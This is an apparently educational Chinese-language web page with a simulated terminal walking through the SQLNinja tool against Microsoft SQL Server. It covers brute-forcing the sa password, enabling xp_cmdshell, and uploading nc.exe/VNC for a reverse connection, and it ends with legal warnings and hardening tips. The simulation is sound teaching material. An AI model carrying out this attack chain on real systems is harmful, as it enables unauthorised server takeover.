@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLNinja 權限奪取 | 資安模擬學習</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* --- 1. SQLNinja 主題美術風格 (Enterprise Crimson + Glitch) --- */
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; }
+        body { line-height: 1.6; color: #e6e6e6; background-color: #0a0505; position: relative; overflow-x: hidden; font-family: 'Segoe UI', sans-serif; }
+
+        /* 背景特效：數位雜訊 */
+        .glitch-background {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: 
+                linear-gradient(rgba(10, 0, 0, 0.9), rgba(10, 0, 0, 0.9)),
+                repeating-linear-gradient(90deg, transparent, transparent 2px, #330000 2px, #330000 4px);
+            background-size: 100% 100%;
+        }
+        
+        .static-noise {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0IiBoZWlnaHQ9IjQiPgo8cmVjdCB3aWR0aD0iNCIgaGVpZ2h0PSI0IiBmaWxsPSIjZmYwMDMzIiBmaWxsLW9wYWNpdHk9IjAuMDUiLz4KPC9zdmc+');
+            opacity: 0.3; animation: noise 0.5s steps(3) infinite;
+        }
+
+        @keyframes noise { 0% { background-position: 0 0; } 100% { background-position: 10px 10px; } }
+
+        /* 容器 */
+        .container { width: 90%; max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; }
+
+        /* 頁首 */
+        header {
+            background: rgba(30, 5, 5, 0.95); padding: 4rem 0; text-align: center; margin-bottom: 2rem;
+            border-radius: 4px; border: 1px solid #ff0033; border-bottom: 5px solid #ff0033;
+            box-shadow: 0 0 40px rgba(255, 0, 51, 0.2); position: relative; overflow: hidden;
+        }
+        header h1 {
+            font-size: 2.8rem; margin-bottom: 1rem; color: #ff0033;
+            text-shadow: 2px 2px 0px #660000; letter-spacing: 2px;
+            text-transform: none; /* [修正] 移除強制大寫，保留 SQLNinja 原寫法 */
+        }
+        header p { font-size: 1.2rem; color: #ff99aa; max-width: 800px; margin: 0 auto; }
+
+        /* 導覽列 */
+        nav {
+            background: #1a0505; padding: 1rem; border-radius: 4px; border: 1px solid #ff0033;
+            position: sticky; top: 0; z-index: 100; margin-bottom: 30px; box-shadow: 0 5px 20px rgba(0,0,0,0.8);
+        }
+        nav ul { display: flex; justify-content: center; list-style: none; gap: 20px; flex-wrap: wrap; }
+        nav a {
+            text-decoration: none; color: #ffcccc; font-weight: bold; padding: 8px 16px;
+            border-radius: 2px; transition: 0.3s; border: 1px solid transparent;
+        }
+        nav a:hover { background: rgba(255, 0, 51, 0.2); color: #fff; border-color: #ff0033; }
+
+        /* --- 佈局 --- */
+        .grid-layout { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 40px; }
+        .full-width { width: 100%; margin-bottom: 2rem; }
+        @media (max-width: 1024px) { .grid-layout { grid-template-columns: 1fr; } }
+
+        /* 卡片樣式 */
+        article {
+            background: rgba(20, 5, 5, 0.9); padding: 30px; border-radius: 4px; border: 1px solid #660011; margin-bottom: 30px;
+        }
+        h2 { color: #ff0033; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #660011; font-size: 1.8rem; display: flex; align-items: center; gap: 10px; }
+        h3 { color: #ff6666; margin: 25px 0 15px 0; font-size: 1.4rem; }
+        p, li { margin-bottom: 10px; color: #cccccc; font-size: 1.05rem; }
+        ul { margin-left: 20px; }
+
+        /* 側邊欄 */
+        aside {
+            background: rgba(20, 5, 5, 0.9); padding: 25px; border-radius: 4px; border: 1px solid #ff0033;
+            height: fit-content; box-shadow: 0 0 20px rgba(255, 0, 51, 0.1); position: sticky; top: 100px;
+        }
+
+        /* 提示框 */
+        .info-box { background: rgba(255, 50, 50, 0.1); border-left: 5px solid #ff3333; padding: 20px; margin: 20px 0; border-radius: 4px; }
+        .danger-box { background: rgba(255, 0, 0, 0.2); border-left: 5px solid #880000; padding: 20px; margin: 20px 0; border-radius: 4px; }
+
+        /* --- 模擬器樣式 --- */
+        .simulator-wrapper {
+            background: #000; border: 2px solid #ff0033; border-radius: 4px; overflow: hidden;
+            box-shadow: 0 0 50px rgba(255, 0, 51, 0.2); margin: 20px 0;
+            display: flex; flex-direction: column; height: 750px;
+        }
+
+        .sim-header {
+            background: #220000; padding: 12px 20px; border-bottom: 1px solid #ff0033;
+            display: flex; justify-content: space-between; align-items: center; color: #ff0033; font-family: monospace; font-weight: bold;
+        }
+
+        .sim-grid {
+            display: grid; grid-template-columns: 240px 1fr 340px; flex: 1; overflow: hidden;
+        }
+
+        /* 控制區 */
+        .sim-controls { background: #110000; border-right: 1px solid #660011; padding: 20px; overflow-y: auto; }
+        .sim-btn {
+            width: 100%; padding: 15px; margin-bottom: 12px; background: rgba(255, 0, 51, 0.05); border: 1px solid #660011;
+            color: #ffcccc; text-align: left; cursor: pointer; border-radius: 2px; transition: all 0.2s; font-family: monospace;
+        }
+        .sim-btn:hover { background: rgba(255, 0, 51, 0.15); color: #fff; border-color: #ff0033; }
+        .sim-btn.active { background: rgba(255, 0, 51, 0.25); border-color: #ff0033; color: #fff; border-left: 4px solid #ff0033; box-shadow: 0 0 15px rgba(255, 0, 51, 0.2); font-weight: bold; }
+        .sim-btn strong { display: block; font-size: 1rem; margin-bottom: 4px; }
+
+        /* 終端機 */
+        .sim-terminal {
+            background: #000; padding: 0; display: flex; flex-direction: column; 
+            font-family: 'Consolas', 'Courier New', monospace; position: relative;
+        }
+        .term-body { 
+            flex: 1; padding: 20px; overflow-y: auto; color: #ccc; 
+            font-size: 0.9rem; line-height: 1.4; white-space: pre-wrap; 
+        }
+        .prompt { color: #ff0033; font-weight: bold; margin-right: 10px; }
+        .cursor { display: inline-block; width: 10px; height: 18px; background: #ff0033; animation: blink 1s infinite; vertical-align: text-bottom; }
+
+        /* 解析區 */
+        .sim-decoder { background: #110000; border-left: 1px solid #660011; display: flex; flex-direction: column; }
+        .decoder-header { padding: 15px; background: #220000; border-bottom: 1px solid #660011; color: #ff0033; font-weight: bold; font-size: 1.1rem; }
+        .decoder-content { padding: 25px; flex: 1; overflow-y: auto; }
+        
+        .explanation-card { 
+            background: rgba(255, 0, 51, 0.08); border-left: 4px solid #ff0033; 
+            padding: 20px; border-radius: 4px; animation: slideIn 0.3s ease;
+        }
+        .analogy { 
+            margin-top: 15px; padding: 10px; background: rgba(255, 255, 255, 0.05); 
+            border-radius: 4px; color: #ffcccc; font-style: italic; border: 1px dashed #ff0033;
+        }
+
+        /* 重置按鈕 */
+        .reset-btn {
+            background: transparent; border: 1px solid #ff0033; color: #ff0033; 
+            padding: 4px 12px; font-size: 0.8rem; cursor: pointer; transition: 0.3s;
+            font-family: monospace; text-transform: uppercase;
+        }
+        .reset-btn:hover { background: #ff0033; color: #000; }
+
+        /* [修復] 表格排版樣式 */
+        .tech-table { 
+            width: 100%; border-collapse: collapse; margin-top: 15px; 
+            background: rgba(255,0,51,0.02); border: 1px solid #660011;
+        }
+        .tech-table th { 
+            text-align: left; padding: 12px; 
+            background: rgba(255, 0, 51, 0.1); color: #ff0033; 
+            border-bottom: 2px solid #ff0033; 
+        }
+        .tech-table td { 
+            padding: 12px; border-bottom: 1px solid #330000; 
+            vertical-align: top; font-size: 0.95rem;
+        }
+        .tech-table tr:last-child td { border-bottom: none; }
+        .tech-table tr:hover { background: rgba(255,0,51,0.05); }
+
+        /* [新增] 代碼膠囊樣式 (用於表格內的指令) */
+        .code-pill {
+            display: inline-block;
+            background: #330000;
+            color: #ff3333;
+            border: 1px solid #ff0033;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 0.9rem;
+            white-space: nowrap; /* 防止指令換行 */
+        }
+
+        @keyframes blink { 50% { opacity: 0; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* RWD */
+        @media (max-width: 1200px) { .sim-grid { grid-template-columns: 200px 1fr 280px; } }
+        @media (max-width: 900px) {
+            .sim-grid { grid-template-columns: 1fr; grid-template-rows: auto 400px auto; }
+            .sim-decoder { border-left: none; border-top: 1px solid #660011; height: 350px; }
+            .simulator-wrapper { height: auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glitch-background"></div>
+    <div class="static-noise"></div>
+
+    <header>
+        <div class="container">
+            <h1><i class="fas fa-server"></i> SQLNinja 權限奪取</h1>
+            <p>專攻 Microsoft SQL Server • 從注入漏洞到遠端系統控制</p>
+        </div>
+    </header>
+
+    <nav>
+        <div class="container">
+            <ul>
+                <li><a href="#intro">工具介紹</a></li>
+                <li><a href="#install">環境準備</a></li>
+                <li><a href="#simulation">權限奪取演示</a></li>
+                <li><a href="#features">核心功能</a></li>
+                <li><a href="#ethics">法律規範</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        
+        <div class="grid-layout">
+            <div class="content-left">
+                <article id="intro">
+                    <h2><i class="fas fa-biohazard"></i> 什麼是 SQLNinja？</h2>
+                    <p><strong>SQLNinja</strong> 是一款專門針對 <strong>Microsoft SQL Server</strong> 的滲透測試工具。它與 SQLMap 最大的不同在於目標：SQLMap 擅長「脫庫（偷資料）」，而 SQLNinja 擅長**「奪權（取得 Shell）」**。</p>
+                    <p>如果網頁應用程式使用高權限的資料庫帳號（如 `sa`）連接 MSSQL，SQLNinja 可以利用注入漏洞開啟 `xp_cmdshell`，進而執行作業系統指令，甚至開啟 VNC 遠端桌面。</p>
+                    
+                    <div class="info-box">
+                        <p><strong><i class="fas fa-crosshairs"></i> 適用情境：</strong></p>
+                        <ul>
+                            <li>目標資料庫是 Microsoft SQL Server (2000/2005/2008/2012...)。</li>
+                            <li>目標可能位於防火牆後，需要反向連接 (Reverse Shell)。</li>
+                            <li>目標是 Windows Server 環境。</li>
+                        </ul>
+                    </div>
+                </article>
+
+                <article id="install">
+                    <h2><i class="fas fa-terminal"></i> 安裝與設定</h2>
+                    <p>SQLNinja 是用 Perl 編寫的，內建於 Kali Linux。它的操作高度依賴設定檔。</p>
+                    <pre><code style="color:#ff0033;"># 安裝 (若未安裝)
+sudo apt install sqlninja
+
+# 編輯設定檔 (這是關鍵步驟!)
+vim /etc/sqlninja.conf
+
+# 啟動工具
+sqlninja -m &lt;mode&gt; -f &lt;config_file&gt;</code></pre>
+                </article>
+            </div>
+
+            <aside>
+                <div style="margin-bottom: 30px;">
+                    <h3 style="margin-top:0; border-bottom:1px solid #660011; padding-bottom:10px;">
+                        <i class="fas fa-laptop-code"></i> 實驗配置
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 10px 0; border-bottom: 1px solid #660011;">
+                            <i class="fas fa-check" style="color:#ff0033; margin-right:8px;"></i> 攻擊機: Kali Linux
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #660011;">
+                            <i class="fas fa-bullseye" style="color:#ff0033; margin-right:8px;"></i> 靶機: Windows Server 2012
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #660011;">
+                            <i class="fas fa-database" style="color:#ff0033; margin-right:8px;"></i> DB: SQL Server (sa user)
+                        </li>
+                        <li style="padding: 10px 0;">
+                            <i class="fas fa-cogs" style="color:#ff6666; margin-right:8px;"></i> 目標: Get Shell / VNC
+                        </li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 style="margin-top:0; border-bottom:1px solid #660011; padding-bottom:10px;">
+                        <i class="fas fa-book"></i> 章節導覽
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 8px 0;"><a href="#intro" style="color:#ffcccc; text-decoration:none;">1. 工具介紹</a></li>
+                        <li style="padding: 8px 0;"><a href="#install" style="color:#ffcccc; text-decoration:none;">2. 環境準備</a></li>
+                        <li style="padding: 8px 0;"><a href="#simulation" style="color:#ffcccc;  text-decoration:none;">3. 權限奪取演示</a></li>
+                        <li style="padding: 8px 0;"><a href="#features" style="color:#ffcccc; text-decoration:none;">4. 核心功能</a></li>
+                        <li style="padding: 8px 0;"><a href="#ethics" style="color:#ffcccc; text-decoration:none;">5. 法律規範</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+
+        <div class="full-width">
+            <article id="simulation" style="border: 2px solid #ff0033; box-shadow: 0 0 30px rgba(255, 0, 51, 0.1);">
+                <h2><i class="fas fa-skull"></i> 互動虛擬實驗室</h2>
+                <p>我們將模擬攻擊一台存在 SQL 注入漏洞的 Windows Server。目標不是偷資料，而是<strong>取得作業系統的控制權</strong>。</p>
+                
+                <div class="simulator-wrapper">
+                    <div class="sim-header">
+                        <div><i class="fas fa-terminal"></i> KALI ROOT TERMINAL (SQLNINJA)</div>
+                        <button class="reset-btn" onclick="resetSim()">
+                            <i class="fas fa-redo"></i> 重置模擬器
+                        </button>
+                    </div>
+
+                    <div class="sim-grid">
+                        <div class="sim-controls">
+                            <button class="sim-btn" onclick="runStep(1)" id="btn-1">
+                                <strong>Step 1: 設定配置檔</strong><span>vim sqlninja.conf</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(2)" id="btn-2">
+                                <strong>Step 2: 連線測試 (Test)</strong><span>sqlninja -m t</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(3)" id="btn-3">
+                                <strong>Step 3: 指紋識別 (Fingerprint)</strong><span>sqlninja -m f</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(4)" id="btn-4">
+                                <strong>Step 4: 暴力破解 sa 密碼</strong><span>sqlninja -m b</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(5)" id="btn-5" style="border-left: 3px solid #ff6600; background: rgba(255,100,0,0.05);">
+                                <strong>Step 5: 提權 XP_CMDSHELL</strong><span>sqlninja -m e</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(6)" id="btn-6" style="border-left: 3px solid #ff0033; background: rgba(255,0,0,0.1);">
+                                <strong style="color:#ff0033;">Step 6: 上傳並執行 VNC</strong><span>sqlninja -m u</span>
+                            </button>
+                        </div>
+
+                        <div class="sim-terminal">
+                            <div class="term-body" id="term-body">
+                                <div>Kali GNU/Linux Rolling [Version 2024.1]</div>
+                                <br>
+                                <div id="prompt-line" style="display:flex; flex-wrap:wrap;">
+                                    <span class="prompt" id="prompt-text">root@kali:~#</span>
+                                    <span id="typing-area"></span><span class="cursor"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="sim-decoder">
+                            <div class="decoder-header"><i class="fas fa-user-secret"></i> 攻擊日誌</div>
+                            <div class="decoder-content" id="decoder-content">
+                                <div style="text-align: center; color: #ff6666; margin-top: 100px;">
+                                    <i class="fas fa-server fa-3x" style="margin-bottom: 20px;"></i><br>
+                                    滲透工具就緒<br>點擊左側 <strong>Step 1</strong> 載入配置
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+        </div>
+
+        <div class="grid-layout">
+            
+            <div class="content-left">
+                <article id="features">
+                    <h2><i class="fas fa-cogs"></i> SQLNinja 攻擊模式 (-m)</h2>
+                    <p>SQLNinja 的功能透過 <code>-m</code> 參數切換，以下是幾個關鍵模式：</p>
+                    
+                    <table class="tech-table">
+                        <thead>
+                            <tr>
+                                <th width="30%">模式代號</th>
+                                <th>功能說明</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><span class="code-pill">test (t)</span></td>
+                                <td><strong style="color:#ffcccc;">連線測試</strong><br>確認注入點是否有效，以及是否能與目標溝通。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">fingerprint (f)</span></td>
+                                <td><strong style="color:#ffcccc;">指紋識別</strong><br>偵測 SQL Server 版本、使用者權限 (sa/dbo)。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">bruteforce (b)</span></td>
+                                <td><strong style="color:#ff6666;">暴力破解</strong><br>如果當前權限不夠，嘗試猜解 <code>sa</code> 帳號密碼。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">escalation (e)</span></td>
+                                <td><strong style="color:#ff0033;">權限提升</strong><br>啟用 <code>xp_cmdshell</code>，這是執行系統指令的關鍵。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">upload (u)</span></td>
+                                <td><strong style="color:#ff0033;">上傳執行</strong><br>利用 debug.exe 或 vbs 將木馬 (nc.exe, VNC) 傳入目標並執行。</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </article>
+            </div>
+
+            <div class="content-right">
+                <article id="ethics">
+                    <h2><i class="fas fa-gavel"></i> 法律與道德</h2>
+                    
+                    <div class="danger-box">
+                        <h3><i class="fas fa-exclamation-triangle"></i> 嚴重警告</h3>
+                        <p>使用 SQLNinja 取得系統 Shell 或 VNC 權限，屬於<strong>非法控制電腦系統</strong>，違反刑法第 358、359 條，刑責極重。</p>
+                    </div>
+
+                    <div style="margin-bottom:20px;">
+                        <h4 style="color:#ff0033; margin-bottom:10px;">防禦建議</h4>
+                        <ul>
+                            <li>不要使用 <code>sa</code> 帳號連線網頁</li>
+                            <li>停用 <code>xp_cmdshell</code></li>
+                            <li>更新 SQL Server 補丁</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-box" style="text-align: center;">
+                        <h4 style="margin-top: 0; color: #fff;">資安倫理</h4>
+                        <p>權限越大，責任越重。</p>
+                        <p style="color: #ff0033; font-weight: bold; margin-top: 10px;">
+                            No Authorization, No Access.
+                        </p>
+                    </div>
+                </article>
+            </div>
+        </div>
+
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 SQLNinja 權限奪取 | 僅供資安教育用途</p>
+            <p>請務必遵守法律與道德規範</p>
+        </div>
+    </footer>
+
+    <script>
+        const termBody = document.getElementById('term-body');
+        const promptLine = document.getElementById('prompt-line');
+        const promptText = document.getElementById('prompt-text');
+        const typingArea = document.getElementById('typing-area');
+        const decoderContent = document.getElementById('decoder-content');
+        
+        let isTyping = false;
+        let typingTimer = null;
+        let currentPromptStr = "root@kali:~#";
+
+        // 模擬數據
+        const scenarios = {
+            1: {
+                cmd: "vim sqlninja.conf",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 1: 設定配置檔 (Configuration)</h4>
+                        <p style="color:#ccc;">SQLNinja 需要知道攻擊目標的所有細節。</p>
+                        <p style="color:#ccc;">我們編輯 <code>sqlninja.conf</code>，填入：</p>
+                        <ul>
+                            <li><strong>host</strong> = 192.168.1.50 (靶機 IP)</li>
+                            <li><strong>page</strong> = /product.asp?id=1 (注入點)</li>
+                            <li><strong>method</strong> = GET</li>
+                        </ul>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你要去搶銀行，出發前必須先畫好地圖，標記好金庫位置和逃生路線。這個設定檔就是你的作戰計畫書。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[Config Loaded] Host: 192.168.1.50", color: "#888", wait: 500 },
+                    { text: "[Config Loaded] Page: /product.asp?id=1", color: "#888", wait: 700 },
+                    { text: "[Config Loaded] Method: GET", color: "#888", wait: 900 },
+                    { text: "sqlninja configuration saved.", color: "#00ff00", wait: 1200 },
+                    { text: "root@kali:~#", type: "prompt", wait: 1500 }
+                ]
+            },
+            2: {
+                cmd: "sqlninja -m t -f sqlninja.conf",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 2: 連線測試 (Test)</h4>
+                        <p style="color:#ccc;">使用 <code>-m t</code> 模式。</p>
+                        <p style="color:#ccc;">SQLNinja 會嘗試注入 SQL 語法，確認我們是否能與資料庫「溝通」。如果成功，表示注入點有效。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你用無線電呼叫：「老鷹呼叫總部，收到請回答。」對方回：「收到。」確認通訊管道暢通，可以開始行動。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "SQLNinja v0.2.6-r1", wait: 300 },
+                    { text: "[+] Targeting 192.168.1.50...", wait: 500 },
+                    { text: "[+] Trying to inject a test query...", wait: 800 },
+                    { text: "    ...success!", color: "#00ff00", wait: 1200 },
+                    { text: "[+] Connection to SQL Server established.", wait: 1500 },
+                    { text: "root@kali:~#", type: "prompt", wait: 1800 }
+                ]
+            },
+            3: {
+                cmd: "sqlninja -m f -f sqlninja.conf",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 3: 指紋識別 (Fingerprint)</h4>
+                        <p style="color:#ccc;">使用 <code>-m f</code> 模式。</p>
+                        <p style="color:#ccc;">我們需要知道對手是誰。SQLNinja 檢測出這是 <strong>SQL Server 2012</strong>，且當前使用者是 <strong>sa (System Administrator)</strong>。這是最高權限！</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你發現守門的警衛竟然擁有金庫鑰匙 (sa 權限)。這下子不用炸門了，直接拿他的鑰匙開門就好。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[+] Checking SQL Server version...", wait: 500 },
+                    { text: "    Version: Microsoft SQL Server 2012 - 11.0.2100.60 (X64)", color: "#ff99aa", wait: 1000 },
+                    { text: "[+] Checking current user...", wait: 1200 },
+                    { text: "    User: sa (System Administrator)", color: "#ff0033", style: "font-weight:bold;", wait: 1500 },
+                    { text: "[!] WARNING: We are running as sysadmin!", color: "#ff0033", wait: 1700 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2000 }
+                ]
+            },
+            4: {
+                cmd: "sqlninja -m b -f sqlninja.conf",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 4: 暴力破解 sa 密碼 (Bruteforce)</h4>
+                        <p style="color:#ccc;">雖然我們已經是 sa，但為了確保能持續連線（或開啟 VNC），我們最好知道 sa 的密碼。</p>
+                        <p style="color:#ccc;">SQLNinja 使用字典攻擊猜解 sa 密碼。Bingo! 密碼是 <code>P@ssw0rd123</code>。</p>
+                    </div>`,
+                output: [
+                    { text: "[+] Starting dictionary attack on 'sa' account...", wait: 500 },
+                    { text: "    Trying: admin... failed", color: "#888", wait: 800 },
+                    { text: "    Trying: 123456... failed", color: "#888", wait: 1000 },
+                    { text: "    Trying: P@ssw0rd123... FOUND!", color: "#00ff00", style: "font-weight:bold;", wait: 1500 },
+                    { text: "[+] Password for user 'sa' is 'P@ssw0rd123'", color: "#ffaa00", wait: 1800 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2000 }
+                ]
+            },
+            5: {
+                cmd: "sqlninja -m e -f sqlninja.conf",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 5: 提權 XP_CMDSHELL (Escalation)</h4>
+                        <p style="color:#ccc;">這是最關鍵的一步！</p>
+                        <p style="color:#ccc;"><code>xp_cmdshell</code> 是 MSSQL 的擴充預存程序，允許執行系統指令。SQLNinja 發現它被停用了，但因為我們是 sa，所以可以<strong>強行啟用</strong>它。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你發現控制台上有個「緊急按鈕」被鎖住了。但因為你是管理員，你直接把鎖砸爛，按下了那個按鈕，取得了系統的控制權。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[+] Checking xp_cmdshell status...", wait: 500 },
+                    { text: "    xp_cmdshell is DISABLED.", color: "#ff6666", wait: 800 },
+                    { text: "[+] Attempting to enable xp_cmdshell via sp_configure...", wait: 1000 },
+                    { text: "    Reconfiguring advanced options...", wait: 1200 },
+                    { text: "    Enabling xp_cmdshell...", wait: 1400 },
+                    { text: "    ...success!", color: "#00ff00", wait: 1600 },
+                    { text: "[+] xp_cmdshell is now ACTIVE. We can run system commands.", color: "#ff0033", wait: 1800 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2000 }
+                ]
+            },
+            6: {
+                cmd: "sqlninja -m u -f sqlninja.conf",
+                info: `
+                    <div class="explanation-card" style="border-color:#ff0033; background:rgba(255,0,0,0.1);">
+                        <h4 style="color:#ff0033;">Step 6: 上傳 VNC 並執行 (Upload & Pwn)</h4>
+                        <p style="color:#ccc;">遊戲結束。我們利用 <code>xp_cmdshell</code> 一步步將 VNC 伺服器 (vncdll.dll) 寫入目標硬碟。</p>
+                        <p style="color:#ccc;">最後注入 VNC 到記憶體，我們獲得了圖形化遠端桌面控制權。</p>
+                        <div class="analogy">
+                            <strong>⚠️ 震撼教育：</strong>駭客不只偷了資料，還在你的電腦裡裝了遠端操控軟體。現在，你的螢幕、你的滑鼠，都由他控制。這就是所謂的「Pwned」。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[+] Preparing to upload VNC server...", wait: 500 },
+                    { text: "    converting nc.exe to debug script...", wait: 800 },
+                    { text: "    uploading lines 1-100...", wait: 1000 },
+                    { text: "    uploading lines 101-200...", wait: 1200 },
+                    { text: "    ...upload completed.", wait: 1500 },
+                    { text: "[+] Executing VNC server injection...", wait: 1800 },
+                    { text: "    Target connects back to 192.168.1.100:5500", wait: 2000 },
+                    { text: "[!] VNC SESSION ESTABLISHED!", color: "#ff0033", style: "font-weight:bold; font-size:1.2rem; background:rgba(255,0,0,0.2); padding:5px;", wait: 2500 },
+                    { text: "root@kali:~#", type: "prompt", wait: 3000 }
+                ]
+            }
+        };
+
+        // 執行步驟
+        function runStep(id) {
+            if (isTyping) return;
+            isTyping = true;
+            
+            const data = scenarios[id];
+            document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('btn-' + id).classList.add('active');
+
+            typeCommand(data.cmd, () => {
+                addHistoryLog(currentPromptStr, data.cmd);
+                decoderContent.innerHTML = data.info;
+                
+                let maxWait = 0;
+                if(data.output) {
+                    data.output.forEach(line => {
+                        setTimeout(() => {
+                            if(line.type === 'prompt') {
+                                updatePrompt(line.text);
+                            } else {
+                                printText(line.text, line.color, line.style);
+                            }
+                        }, line.wait);
+                        if(line.wait > maxWait) maxWait = line.wait;
+                    });
+                }
+                setTimeout(() => {
+                    isTyping = false;
+                }, maxWait + 200);
+            });
+        }
+
+        // 打字動畫
+        function typeCommand(text, callback) {
+            typingArea.textContent = "";
+            let i = 0;
+            typingTimer = setInterval(() => {
+                typingArea.textContent += text.charAt(i);
+                i++;
+                if (i >= text.length) {
+                    clearInterval(typingTimer);
+                    setTimeout(() => {
+                        typingArea.textContent = ""; 
+                        callback();
+                    }, 300);
+                }
+            }, 30);
+        }
+
+        function addHistoryLog(p, c) {
+            const div = document.createElement('div');
+            div.innerHTML = `<span class="prompt">${p}</span> ${c}`;
+            termBody.insertBefore(div, promptLine);
+            scrollToBottom();
+        }
+
+        function printText(text, color, style) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            if(color) div.style.color = color;
+            if(style) div.setAttribute('style', `color:${color}; ${style}`);
+            termBody.insertBefore(div, promptLine);
+            scrollToBottom();
+        }
+
+        function updatePrompt(text) {
+            currentPromptStr = text;
+            promptText.textContent = text;
+            scrollToBottom();
+        }
+
+        function scrollToBottom() {
+            termBody.scrollTop = termBody.scrollHeight;
+        }
+
+        function resetSim() {
+            if(isTyping) return;
+            const logs = termBody.querySelectorAll('div:not(#prompt-line)');
+            for(let i=1; i<logs.length; i++) logs[i].remove();
+            
+            const welcome1 = document.createElement('div');
+            welcome1.textContent = "Kali GNU/Linux Rolling [Version 2024.1]";
+            termBody.insertBefore(welcome1, promptLine);
+            const br = document.createElement('div');
+            br.innerHTML = "<br>";
+            termBody.insertBefore(br, promptLine);
+
+            updatePrompt("root@kali:~#");
+            typingArea.textContent = "";
+
+            decoderContent.innerHTML = `
+                <div style="text-align: center; color: #ff6666; margin-top: 100px;">
+                    <i class="fas fa-server fa-3x" style="margin-bottom: 20px;"></i><br>
+                    滲透工具就緒<br>點擊左側 <strong>Step 1</strong> 載入配置
+                </div>`;
+            document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
+        }
+    </script>
+</body>
+</html>
